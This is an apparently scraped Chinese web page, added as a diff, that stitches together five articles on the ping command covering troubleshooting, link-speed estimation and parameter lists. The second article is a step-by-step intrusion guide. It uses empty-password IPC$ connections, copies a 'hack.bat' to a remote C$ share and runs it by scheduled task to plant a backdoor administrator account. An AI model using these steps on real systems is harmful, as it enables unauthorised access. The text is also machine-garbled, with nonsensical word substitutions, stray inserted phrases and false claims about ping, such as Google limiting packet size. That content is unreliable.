@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+ <head> 
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge" /> 
+  <meta charset="UTF-8" /> 
+  <meta name="viewport" content="width=device-width" /> 
+  <meta name="format-detection" content="telephone=no" /> 
+  <title>Ping检查连通性有五个步骤：使用Ping/远程IP地址</title> 
+  <meta name="robots" content="max-image-preview:large" /> 
+  <meta name="description" content="Ping检查连通性有五个步骤：使用Ping/远程IP地址" /> 
+  <meta name="keywords" content="" /> 
+  <meta name="thumbnail" content="https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg" />
+  <meta name="twitter:description"content="Ping检查连通性有五个步骤：使用Ping/远程IP地址">
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="">
+  <meta name="twitter:title" content="Ping检查连通性有五个步骤：使用Ping/远程IP地址" />
+  <meta name="twitter:image:src" content="https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg" />
+  <meta property="og:description"content="Ping检查连通性有五个步骤：使用Ping/远程IP地址" />
+  <meta property="og:keywords" content="" />
+  <meta property="og:image" content="https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg" />
+  <meta property="og:version" content="Hugo 0.113.0">
+  <meta property="og:title" content="Ping检查连通性有五个步骤：使用Ping/远程IP地址" />
+  <meta property="og:url" content="https://wonima136.github.io/linux-cool/knowledge/pjcltxywgbzs/" />
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Linux" />
+  <meta property="og:locale" content="en" />
+  <meta property="og:article:published_time" content=" 2023-06-18 16:22" />
+  <link rel="stylesheet" id="wp-block-library-css" href="/css/style.min.css" type="text/css" media="all" />
+  <link rel="stylesheet" id="htgb-style-css-css" href="/css/blocks.style.build.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="classic-theme-styles-css" href="/css/classic-themes.min.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="classic-theme-styles-css" href="/css/inline.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="shortcodes-css-css" href="/css/shortcodes.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="theme-style-css" href="/css/style.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="theme-font-css" href="/css/css.css" type="text/css" media="all" /> 
+  <link rel="stylesheet" id="font-awesome-css" href="/css/font-awesome.min.css" type="text/css" media="all" /> 
+  <script type="text/javascript" src="/js/jquery.min.js" id="jquery-core-js"></script> 
+  <script type="text/javascript" src="/js/jquery-migrate.min.js" id="jquery-migrate-js"></script> 
+  <style type="text/css" id="wp-custom-css">
+		p {line-height: 200%}
+		.entry-content p { text-indent: 2em
+ </style> 
+ </head> 
+ 
+ <body class="home blog wp-embed-responsive"> 
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-dark-grayscale">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0 0.49803921568627" />
+      <fefuncg type="table" tablevalues="0 0.49803921568627" />
+      <fefuncb type="table" tablevalues="0 0.49803921568627" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-grayscale">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0 1" />
+      <fefuncg type="table" tablevalues="0 1" />
+      <fefuncb type="table" tablevalues="0 1" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-purple-yellow">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0.54901960784314 0.98823529411765" />
+      <fefuncg type="table" tablevalues="0 1" />
+      <fefuncb type="table" tablevalues="0.71764705882353 0.25490196078431" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-blue-red">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0 1" />
+      <fefuncg type="table" tablevalues="0 0.27843137254902" />
+      <fefuncb type="table" tablevalues="0.5921568627451 0.27843137254902" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-midnight">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0 0" />
+      <fefuncg type="table" tablevalues="0 0.64705882352941" />
+      <fefuncb type="table" tablevalues="0 1" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-magenta-yellow">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0.78039215686275 1" />
+      <fefuncg type="table" tablevalues="0 0.94901960784314" />
+      <fefuncb type="table" tablevalues="0.35294117647059 0.47058823529412" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-purple-green">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0.65098039215686 0.40392156862745" />
+      <fefuncg type="table" tablevalues="0 1" />
+      <fefuncb type="table" tablevalues="0.44705882352941 0.4" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+   <defs>
+    <filter id="wp-duotone-blue-orange">
+     <fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " />
+     <fecomponenttransfer color-interpolation-filters="sRGB">
+      <fefuncr type="table" tablevalues="0.098039215686275 1" />
+      <fefuncg type="table" tablevalues="0 0.66274509803922" />
+      <fefuncb type="table" tablevalues="0.84705882352941 0.41960784313725" />
+      <fefunca type="table" tablevalues="1 1" />
+     </fecomponenttransfer>
+     <fecomposite in2="SourceGraphic" operator="in" />
+    </filter>
+   </defs>
+  </svg> 
+   
+  <div id="site-container" class="clearfix"> 
+    
+   <header id="site-header" class="clearfix" role="banner"> 
+    <div class="ht-container"> 
+      
+     <div id="logo"> 
+      <h1> <a title="Ping检查连通性有五个步骤：使用Ping/远程IP地址" href="https://wonima136.github.io/linux-cool/">Linux</a> </h1> 
+     </div> 
+     <br /> 
+     <p> </p> 
+      
+    </div> 
+   </header> 
+    
+
+
+
+<div id="live-search">
+  <div class="ht-container">
+    <div id="search-wrap">
+      <form role="search" method="get" id="searchform" class="clearfix" action="/search/">
+        <input type="text" onfocus="if (this.value == '请输入一个命令或相关功能') {this.value = '';}" onblur="if (this.value == '')  {this.value = '请输入一个命令或相关功能';}" value="请输入一个命令或相关功能" name="s" id="s" autocapitalize="off" autocorrect="off" autocomplete="off" />
+        <i class="live-search-loading fa fa-spinner fa-spin"></i>
+        <button type="submit" id="searchsubmit"><i class="fa fa-search"></i><span>查询</span></button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+  $(function () {
+    $('#search-form').submit(function (event) {
+      event.preventDefault();
+      var query = $('#search-box').val();
+      search(query);
+    });
+  });
+</script>
+        
+        <div id="primary" class="sidebar-right clearfix">
+            
+            <div class="ht-container">
+
+                <section id="content" role="main">
+
+                    <header id="page-header" class="clearfix">
+                        <h1 class="page-title">Ping检查连通性有五个步骤：使用Ping/远程IP地址</h1>
+                     
+                        <div class="center" style="margin-top: 0px;">
+                            <div id="breadcrumbs">
+                                <a href="https://wonima136.github.io/linux-cool/">
+                                    <icon class="fa fa-home"></icon>
+                                </a><span class="sep">/</span>真正好用的Linux命令在线查询手册<span class="sep">/</span>
+                              
+                            </div>
+                    </header>
+
+
+                        <div class="entry-content">
+							<p>第一篇：ping命令检查网路步骤</p>
+<p>使用Ping检测连通性有五个步骤：</p>
+<p>1.使用ipconfig/all观察本地网路设置是否正确；</p>
+<p>2.Ping127.0.0.1，127.0.0.1回送地址Ping回送地址是为了检测本地的TCP/IP合同有没有设置好；3.Ping本机IP地址，这样是为了检测本机的IP地址是否设置有误；</p>
+<p>(4.Ping本网网段或本网IP地址，这样的是为了检测硬件设备是否有问题，也可以检测本机与本地网路联接是否正常；（在非局域网中这一步骤可以忽视)</p>
+<p>5.Ping远程IP地址，这主要是检测本网或本机与外部的联接是否正常。</p>
+<p>在检测网路连通的过程中可能出现一些错误，这种错误总的来说分为两种最常见:1.RequestTimedOut“requesttimeout”这提示不仅对方可能装有防火墙或已死机以外，还有就是本机的IP不正确和网段设置错误。①、IP不正确：IP不正确主要是IP地址设置错误或IP地址冲突，这可以借助ipconfig/all这命令来检测。在WIN2000下IP冲突的情况极少发生，由于系统会手动检查在网路中是否有相同的IP地址并提醒你是否设置正确。在NT中不但会出现“requesttimeout”这提示并且会出现“Hardwareerror”这提示信息比较特殊不要给它的提示所蒙蔽。</p>
+<p>②、网关设置错误：这个错误可能会在第四个步骤出现。网段设置错误主要是网段地址设置不正确或网段没有帮你转发数据，还有就是可能远程网段失效。这儿主要是在你Ping外部网路地址时出错。错误表现为难以Ping外部主机返回信息“Requesttimeout”。</p>
+<p>2.DestinationHostUnreachable当你在开始PING网路计算机时假如网路设备出错它返回信息会提示“destinationhostunreachable”。假如局域网中使用DHCP分配IP时，而恰巧DHCP失效，这时使用PING命令还会形成此错误。由于在DHCP失效时顾客机未能分配到IP系统只有自设IP，它常常会设为不同子网的IP。所以会出现“DestinationHostUnreachable”。另外子网网段设置错误也会出现这错误。</p>
+<p>还有一个比较特殊就是路由返回错误信息，它通常还会在“DestinationHostUnreachable”前加上IP地址说明那个路由不能抵达目标主机。这说明你的机器与外部网路联接没有问题，但与某台主机联接存在问题。</p>
+<p>(举个反例吧。我管理的网路有19台机，由一台100M网桥联接服务器，使用DHCP动态分配IP地址。有一次有位朋友匆匆地告诉我“我的OUTLOOK打不开了”，我到他机器检测，首先我检测了本地网路设置，我用ipconfig/all看IP分配情况一切正常。接着我就开始PING网路中的其中一台机器，第一次PING结果很正常，但OUTLOOK还是未能使用其它网路软件和Copy网路文件都可以使用但网路速率很慢，第二次PING我用了一个参数-t（-t可以不中断地PING对方，当时我想PING一次可能发觉不了问题) 发觉有time=30ms和requesttimeout，从服务器PING这台机就更有趣，requesttimeout比正常数据还多，在局域中居然有time=30ms和requesttimeout太不正常了。开始我觉得是网卡的问题但换网卡后故障仍然，重做网线还是不能解决问题红旗linux操作系统，这故障真有趣！最后我没办法了把它插在网桥端口上的另一端的网线换到另一个端口，哈！故障解决了。原先是网桥端口坏了。</p>
+<p>怎样用Ping命令来判定一条链路的速率？</p>
+<p>Ping这个命令不仅可以检测网路的连通和检查故障以外，还有一个比较有趣的用途，那就是可以借助它的一些返回数据，来计算你跟某台主机之间的速率是多少字节每秒我们先来瞧瞧它有这些返回数据。</p>
+<p>(Pinging202.105.136.105with32bytesofdata:Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=601msTTL=114Pingstatisticsfor202.105.136.105:Packets:Sent=4,Received=4,Lost=0(0%loss),Approximateroundtriptimesinmilli-seconds:Minimum=590ms,Maximum=601ms,Average=593ms在事例中“bytes=32”表示ICMP报文中有32个字节的测试数据（这是计算速率的关键数据) ，“time=590ms”是往返时间。</p>
+<p>如何计算链路的速率呢？举个反例吧。我们把A和B之间设置为PPP链路。</p>
+<p>(从前面的PING事例可以注意到，默认情况下发送的ICMP报文有32个字节。不仅这32个字节外再加上20个字节的IP首部和8个字节的ICMP首部，整个IP数据报文的总宽度就是60个字节（由于IP和ICMP是Ping命令的主要使用合同，所以整个数据报文要加上它们) 。另外在使用Ping命令时还使用了另一个合同进行传输，那就是PPP合同（点对点合同），所以在数据的开始和结尾再加上8个字节。在传输过程中，因为每位字节富含8bit数据、1bit起始位和1bit结束位，因而传输速度是每位字节2.98ms。由此我们可以恐怕须要405ms。即68<em>2.98</em>2（乘2是由于我们还要估算它的往返时间）。我们来测试一下33600b/s的链路：</p>
+<p>Pinging202.105.36.125with32bytesofdata:Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=421msTTL=114Pingstatisticsfor202.105.36.125:Packets:Sent=4,Received=4,Lost=0(0%loss),Approximateroundtriptimesinmilli-seconds:Minimum=415ms,Maximum=421ms,Average=417ms看是不是差不多啊。^_^</p>
+<p>(这儿你们可能要注意到，这计算值跟实际值是有偏差的，为何呢？由于我们如今计算的是一个理论值，还有一些东西我们没有考虑。诸如在网路中的其它干扰，这种干扰主要来之别的计算机。由于在你测试时不可能全部计算机停止使用网路给你做测试，这是不实际的。另外就是传输设备，由于有个别设备如MODEM它在传输时会把数据压缩后再发送，这大大降低了传输时间。这种东西形成的偏差我们是不能避开的，但其数值大概在5%以内我们都可以接受（借助MODEM传输例外) ，并且可以降低偏差的形成。例如把MODEM的压缩功能关掉和在网路没有这么忙碌时进行测试。有时侯偏差是无须去除的。由于我们须要这种偏差跟所求得的理论值进行比较剖析 <strong>ping命令参数</strong>，进而找出网路的缺陷而进行优化。这时测试网路的所有数据包括偏差就会成为我们优化的根据。</p>
+<p>还要注意，这些算法在局域网并不适用，由于在局域网中速率十分的快几乎多于1ms，而Ping的最小时间帧率是1ms，所以根本难以用Ping命令来测量速率。假如想测试速率那就要用专门仪器来测量。总的来说，Ping命令是一个在故障检测方面很有用并且很便利的工具，你不应当忽略它的存在。</p>
+<p>第二篇：入侵ping命令</p>
+<p>netview*.<em>.</em>.*查看指定IP主机上的共享</p>
+<p>nbtstat-A*.<em>.</em>.*得到远程主机的NetBIOS用户名列表</p>
+<p>copyserver1.exe*.<em>.</em>.*Admin$system32正式当前目录下的Server1.exe复制到对方Admin$共享的System32目录内</p>
+<p>构建IPC$联接</p>
+<p>事例：netuse192.168.1.60ipc$“”/user:”administrator“查看账号—netuser构建账号—netusernamepasswd/add删掉账号—netusernamepasswd/del断掉联接：</p>
+<p>键入“netuse*/del”命令断掉所有的IPC$联接。键入“netuse目标IPIPC$/del”可以删掉指定目标IP的IPC$联接。</p>
+<p>实例：构建侧门账号，步骤如下：(1)编撰BAT文件：</p>
+<p>打开记事本，输入“netuseremile123456/add”和“netlocalgroupadministratorsemile/add”，之后把文件另存为“hack.bat”,保存在cmd当前默认目录下。(2)与目标主机构建IPC$联接，以192.168.1.60为例：</p>
+<p>打开cmd窗口，分别执行命令：</p>
+<p>netuse192.168.1.60ipc$”“/user:”administrator“netusez:192.168.1.60C$(3)拷贝bat文件到目标主机：</p>
+<p>在cmd窗口输入copyhack.bat192.168.1.60C$，把文件拷贝到目标位置；也可以打开映射驱动器用图形界面直接进行拷贝操作。(4)通过计划任务使远程主机执行hack.bat文件：</p>
+<p>首先键入“nettimeIP”查看远程主机的系统时间，再键入“atIPTIMECOMMAND”命令在远程主机上构建计划任务。</p>
+<p>参数说明：IP—目标主机IP；TIME—设定计划任务执行的时间；COMMAND—计划任务要执行的命令，这么处为C:hack.bat。</p>
+<p>计划任务添加完毕后，使用命令“netuse*/del”断开IPC$联接。(5)验证账号是否成功构建：</p>
+<p>等待一段时间，当恐怕远程主机早已执行hack.bat文件后，通过用新账号构建IPC$联接来验证是否成功构建“emile”帐号，联接成功则说明账号成功构建。</p>
+<p>3)获取目标主机上的用户信息：USERINFO.exe和X-Scan是常用的两款获取用户信息的工具。</p>
+<p>a.USERINFO是借助IPC$漏洞来查看目标主机用户信息的工具，通过USERINFO来查看目标主机用户信息的时侯，并不须要事先构建IPC$空联接。命令：USERINFOIPUSER拿来查看目标IP上USER用户信息，之后按照反馈的结果进行具体剖析。</p>
+<p>b.X-Scan扫描器也是借助目标主机存在的IPC$空联接漏洞，获取用户信息，用法略</p>
+<p>netuser查看用户列表</p>
+<p>netuser用户名密码/add添加用户netuser用户名密码修改用户密码</p>
+<p>netlocalgroupadministrators用户名/add添加用户到管理组netuser用户名/delete删掉用户netuser用户名/delete删掉用户netuser用户名查看用户的基本情况netuser用户名/active:no禁用该用户netuser用户名/active:yes启用该用户</p>
+<p>netshare查看计算机IPC$共享资源netshare共享名查看该共享的情况</p>
+<p>netshare共享名=路径设置共享。诸如netsharec$=c:netshare共享名/delete删掉IPC$共享</p>
+<p>netuse查看IPC$联接情况</p>
+<p>netuseipipc$”密码“/user:”用户名”ipc$联接</p>
+<p>nettimeip查看远程计算机上的时间</p>
+<p>copy路径:文件名ip共享名复制文件到早已ipc$联接的计算机上</p>
+<p>netviewip查看计算机上的共享资源</p>
+<p>ftp服务器地址步入FTP服务器</p>
+<p>at查看自己计算机上的计划作业</p>
+<p>atip查看远程计算机上的计划作业</p>
+<p>atip时间命令(注意加c盘)在远程计算机上加一个作业atip计划作业ID/delete删掉远程计算机上的一个计划作业atipall/delete删掉远程计算机上的全部计划作业</p>
+<p>第三篇：ping命令快速搞定网路问题</p>
+<p><img src="https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg" alt="带参数 -a 的ping命令_ping命令参数_ping命令参数详解"></p>
+<p>ping命令快速搞定网路问题</p>
+<p>笔记本不能上网或则忽然不能上网了如何办？请专业人员来修理还是自己瞎急一通呢，下边给你们介绍怎么确切地判定笔记本不能上网问题出在那里？</p>
+<p>又怎样能快捷地解决这故障？下文提供下小方法，这是本人多年工作经验，希望对你们有所帮助！</p>
+<p>笔记本不能上网简单以下几个诱因：系统的IP设置、网卡、MODEM和线路故障。排除硬件及线路的故障问题，我们可以借助Ping命令来快速检查网路状况。</p>
+<p>1.首先，我们点击系统中开始里的运行，在运行栏中输入cmd命令，操作系统中的DOS窗口都会弹出，在这儿我们可以直观和便捷地输入各类DOS命令。</p>
+<p>笔记本右侧-开始-运行-输入CMD确定</p>
+<p>2.接着，我们可以在DOS里输入Ping127.0.0.1，该地址是本地循环地址，如发觉本地址未能Ping通，就表明本地机TCP/IP合同不能正常工作,这么请重装TCP/IP合同。键入指令判定TCP/IP合同是否正常。</p>
+<p>3.假如里面的操作成功，可Ping通的话，我们接出来可以输入IPConfig来查看本地的IP地址，之后Ping该IP也就是自己的IP，通则表明网卡或MODEM工作正常，不通则是网路适配器出现故障。</p>
+<p>键入指令判定网卡或MODEM工作情况</p>
+<p>ping自己的IP有反还值说明网卡和MODEM正常</p>
+<p>4.之后Ping默认网段的IP，ping默认网段之前要先检测路由器设置上面是不是容许ping网段，检测防火墙设置容许ping出、ping入吗？检测完这种我们开始ping默认网段，不通则此段线路有问题，这么检测网线和路由器是否工作正常。</p>
+<p>ping默认网段来判定本机到路由之间是否正常。</p>
+<p>5.最后，检查一个带DNS服务的网路，简单的说就是ping一个网站，例如Ping，正常情况下会出现退还值，这表明本机的DNS设置正确并且DNS服务器工作正常，那就是我说我们的机器可以联接广域网了。</p>
+<p>ping检查Internet网。</p>
+<p>当以上五个步骤执行完毕后，我们就可轻易判定出究竟是某个环节出现了故障问题，该重新设置的设置，该换硬件的换硬件。</p>
+<p>第四篇：Ping命令总结</p>
+<p>ping127.0.0.1</p>
+<p>通：操作系统TCP/IP功能完好</p>
+<p>(不通：重新给系统安装TCP/IP（类UnixOS不会出现这些状况) ping本地ip</p>
+<p>使用DHCP时，先使用ipconfig查看，若有ip，则正常，且说明局域网化学链路正常。此时ping这个ip，通则说明网卡工作正常。</p>
+<p>(不通：重新安装网卡驱动ping局域网其他机器（多ping几台机器)</p>
+<p>通：局域网TCP/IP工作正常</p>
+<p>不通：检测线路</p>
+<p>检测Hub，Switcher</p>
+<p>看对方机器是否将ICMP回应关闭ping网段</p>
+<p>(通：到网段是OK的，假如不能上网，那就是网段的问题（例如网段将此机器屏蔽，网段到Internet的链接有问题)</p>
+<p>不通：按4检测</p>
+<p>(（此时，就可以上网了，QQ哪些的就可以用了，由于这些东西通常直接用ip) 5pingDNS</p>
+<p>通：全部OK</p>
+<p>不通：换一个DNS</p>
+<p>(本地DNS未设置（DHCP：没有进行DNS透传，自动设定吧)</p>
+<p>第五篇：Ping命令的常用参数选项</p>
+<p>pingIPCt</p>
+<p>连续对IP地址执行Ping命令，直至被用户以Ctrl+C中断。</p>
+<p>pingIP-l3000</p>
+<p>指定Ping命令中的数据宽度为3000字节，而不是缺省的32字节。</p>
+<p>pingIPCn执行特定次数的Ping命令。</p>
+<p>ping命令的完整格式如下：</p>
+<p>ping[-t][-a][-ncount][-llength][-f][-ittl][-vtos][-rcount][-scount][-j-Hostlist]|[-kHost-list][-wtimeout]destination-list</p>
+<p>从这个命令式中可以看出它的复杂程度，ping命令本身前面都是它的执行参数 <strong>ping命令参数</strong>，现对其参数作一下详尽讲解吧！</p>
+<p>-t——有这个参数时，当你ping一个主机时系统就不停的运行ping这个命令linux是什么，直至你按下Control-C。</p>
+<p>-a——解析主机的NETBIOS主机名，假如你想晓得你所ping的要机计算机名则要加上这个参数了，通常是在运用ping命令后的第一行就显示下来。</p>
+<p>-ncount——定义拿来测试所发出的测试包的个数，缺省值为4。通过这个命令可以自己定义发送的个数，对评判网路速率很有帮助，例如我想测试发送20个数据包的返回的平均时间为多少，最快时间为多少，最慢时间为多少就可以通过执行带有这个参数的命令得知。</p>
+<p>-llength——定义所发送缓冲区的数据包的大小，在默认的情况下windows的ping发送的数据包大小为32byt，也可以自己定义，但有一个限制，就是最大只能发送65500byt，超过这个数时，对方就很有可能因接收的数据包太大而关机，所以谷歌公司为了解决这一安全漏洞于是限制了ping的数据包大小。</p>
+<p>-f——在数据包中发送“不要分段”标志，通常你所发送的数据包就会通过路由分段再发送给对方，加上此参数之后路由就不会再分段处理。</p>
+<p>-ittl——指定TTL值在对方的系统里逗留的时间，此参数同样是帮助你检测网路运转情况的。</p>
+<p>-vtos——将“服务类型”字段设置为“tos”指定的值。</p>
+<p>-rcount——在“记录路由”字段中记录传出和返回数据包的路由。通常情况下你发送的数据包是通过一个个路由才抵达对方的，但究竟是经过了什么路由呢？通过此参数就可以设定你想侦测经过的路由的个数，不过限制在了9个，也就是说你只能跟踪到9个路由。</p>
+<p>-scount——指定“count”指定的跃点数的时间戳，此参数和-r差不多，只是这个参数不记录数据包返回所经过的路由，最多也只记录4个。</p>
+<p>-jhost-list——利用“computer-list”指定的计算机列表路由数据包。连续计算机可以被中间网段分隔IP容许的最大数目为9。</p>
+<p>-khost-list——利用“computer-list”指定的计算机列表路由数据包。连续计算机不能被中间网段分隔IP容许的最大数目为9。</p>
+<p>-wtimeout——指定超时间隔，单位为微秒。</p>
+<p>destination-list——是指要测试的主机名或IP地址</p>
+
+							
+
+                        </div>
+
+                    </article>
+
+                    <section id="entry-author" class="clearfix">
+                        <div class="wp-block-image">
+                            <figure class="aligncenter is-resized"><img src="/imgs/author.png" alt="Author" class="wp-image-32" width="300" height="35" /></figure>
+                        </div>
+                        <p style="text-align:center"><strong>这篇优质的内容由TA贡献而来</strong></p>
+                        <p style="text-align:center">Linux</p>
+                        <p style="text-align:center"> 《Linux就该这么学》书籍作者，RHCA认证架构师，教育学（计算机专业硕士）。</p>
+                    </section>
+                </section>
+                
+
+                
+                <aside id="sidebar" role="complementary">
+                    <div id="st_popular_articles_widget-2" class="widget st_popular_articles_widget clearfix">
+                        <h4 class="widget-title"><span>最热命令</span></h4>
+						 <ul class="clearfix">
+							
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/nydlmldqcxyj/" rel="bookmark">鸟爷的Linux命令大全：程序员教你掌握各种奥妙！</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/mssjypcxhdhz/" rel="bookmark">魔兽世界：硬盘出现坏道后怎么办？</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/gxglwjzwlysj/" rel="bookmark">高效管理文件，掌握Linux压缩解压命令！</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/gxwjglxhlcjw/" rel="bookmark">高效文件管理，学会Linux创建文件夹指令</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/gxqdafwqlxbh/" rel="bookmark">高效启动Apache服务器：Linux下必会的命令</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/fyahdgjamljx/" rel="bookmark">防御ARP黑洞攻击：arp命令解析</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/ljdffwqgscyc/" rel="bookmark">连接到FTP服务器格式：从远程主机向本地主机接收文件</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/yczmmlrhljxr/" rel="bookmark">远程桌面命令如何连接向日葵远程控制电脑的屏幕？方法</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/ycfwqdsygswn/" rel="bookmark">远程服务器的使用格式为：-name的自动登录</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/ycsmlnsxdcky/" rel="bookmark">远程screen命令能实现多窗口远程控制的开源服务程序</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/jrvdmlxkyxyx/" rel="bookmark">进入vi的命令新开一行一行</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/yxygydydpdzm/" rel="bookmark">运行一个预定义的perl“stats”的子目录脚本</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/yxlwjbbgsyml/" rel="bookmark">运行Linux文件必备：8个实用命令详解</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/yylmlqspcwlw/" rel="bookmark">运用Linux命令轻松排查网络问题，快速有效解决！</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/srwzfwymzsrn/" rel="bookmark">输入网站访问域名再输入你的网站域名安装完毕</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/qsjjcktxntlc/" rel="bookmark">轻松解决串口通信难题，Linux串口测试命令助你一臂之力！</a> </li>
+							
